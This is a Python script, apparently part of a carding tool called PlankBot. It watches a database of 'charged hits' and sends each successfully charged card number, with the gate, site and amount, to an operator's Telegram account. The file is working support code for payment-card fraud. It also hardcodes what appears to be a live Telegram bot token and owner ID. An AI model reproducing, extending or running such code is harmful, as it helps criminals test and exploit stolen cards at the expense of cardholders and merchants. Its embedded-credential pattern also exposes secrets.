"""
PlankBot DB Watcher
Monitors plankbot.db for new charged hits and sends Telegram DMs.

Setup:
    cp .env.example .env      # fill in your values
    pip install -r requirements.txt
    python watcher.py
"""

import os
import sqlite3
import time
import urllib.request
import urllib.parse


def load_env(path=".env"):
    if not os.path.exists(path):
        return
    with open(path) as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#") and "=" in line:
                k, v = line.split("=", 1)
                os.environ.setdefault(k.strip(), v.strip())


load_env(os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env"))

BOT_TOKEN = "8863097709:AAEjlcMOhvHE3qWgupS_zhuQ23nNNAe8Rno"
OWNER_ID  = 7455136486
DB_PATH   = "/root/projects/PlankBot/plankbot.db"
POLL_SEC  = int(os.getenv("POLL_SEC", "5"))

CHARGED_STATUSES = ("ORDER_PLACED", "ORDER_PROCESSING")


def tg_send(text: str):
    url  = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = urllib.parse.urlencode({
        "chat_id":    OWNER_ID,
        "text":       text,
        "parse_mode": "HTML",
    }).encode()
    try:
        urllib.request.urlopen(url, data=data, timeout=10)
    except Exception as e:
        print(f"[TG ERROR] {e}")


def connect():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def last_id(conn):
    cur = conn.execute("SELECT MAX(id) FROM hit_log")
    val = cur.fetchone()[0]
    return val or 0


def fetch_new(conn, since_id):
    ph  = ",".join("?" * len(CHARGED_STATUSES))
    cur = conn.execute(
        f"SELECT id, user_id, gate, card, response, amount, site "
        f"FROM hit_log WHERE id > ? AND response IN ({ph}) ORDER BY id ASC",
        (since_id, *CHARGED_STATUSES),
    )
    return cur.fetchall()


def format_hit(row):
    return (
        f"<b>⚡ CHARGED HIT</b>\n"
        f"<code>{row['card']}</code>\n"
        f"Gate   : {row['gate'] or 'N/A'}\n"
        f"Site   : {row['site'] or 'N/A'}\n"
        f"Amount : {row['amount'] or 'N/A'}\n"
        f"Status : {row['response']}"
    )


def main():
    if not BOT_TOKEN or not OWNER_ID:
        print("[ERROR] BOT_TOKEN or OWNER_ID not set in .env")
        return

    print(f"[Watcher] DB     : {DB_PATH}")
    print(f"[Watcher] Owner  : {OWNER_ID}")
    print(f"[Watcher] Poll   : every {POLL_SEC}s")

    # Wait for DB to exist (in case PlankBot isn't running yet)
    conn = None
    notified_waiting = False
    while conn is None:
        if os.path.exists(DB_PATH):
            try:
                conn = connect()
            except Exception as e:
                print(f"[DB] Can't open: {e}")
                time.sleep(10)
        else:
            if not notified_waiting:
                print(f"[Watcher] DB not found at {DB_PATH} — waiting...")
                notified_waiting = True
            time.sleep(10)

    prev_id = last_id(conn)
    print(f"[Watcher] DB ready — starting from hit id={prev_id}\n")
    tg_send("✅ <b>Watcher started</b>\nMonitoring for charged hits...")

    while True:
        time.sleep(POLL_SEC)
        try:
            rows = fetch_new(conn, prev_id)
            for row in rows:
                tg_send(format_hit(row))
                print(f"[HIT] id={row['id']}  {row['card']}  {row['site']}")
                prev_id = row["id"]
        except sqlite3.OperationalError as e:
            print(f"[DB ERROR] {e} — reconnecting...")
            try:
                conn    = connect()
                prev_id = last_id(conn)
            except Exception:
                time.sleep(5)
        except Exception as e:
            print(f"[ERROR] {e}")


if __name__ == "__main__":
    main()
